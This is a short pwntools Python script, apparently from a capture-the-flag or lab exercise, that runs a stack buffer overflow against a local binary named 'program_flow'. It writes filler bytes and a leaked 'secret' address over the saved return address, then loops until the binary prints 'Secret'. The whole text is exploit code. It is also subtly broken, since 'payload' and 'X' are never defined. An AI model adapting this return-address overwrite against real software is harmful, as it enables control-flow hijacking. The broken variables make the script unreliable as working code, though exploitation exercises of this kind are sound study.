from pwn import *
import sys
# secret = 0x401182

p = process(['./program_flow', 'payload'])

secret = int(p.readline().strip(), 16)
print(hex(secret), secret)

#sys.exit(0)

for x in range(10000):
    print(x)
    with open(payload, 'wb') as f:
            f.write(b'a'* 8) # buffer
            f.write(b'a'* X) # padding
            f.write(b'a'* 8) # rbp
            f.write(p64(secret))

    p = process(['./program_flow', 'payload'])
    p.readline()
    output = p.readline().strip().decode()
    p.close()

    if 'Secret' in output:
        break
p.interactive()

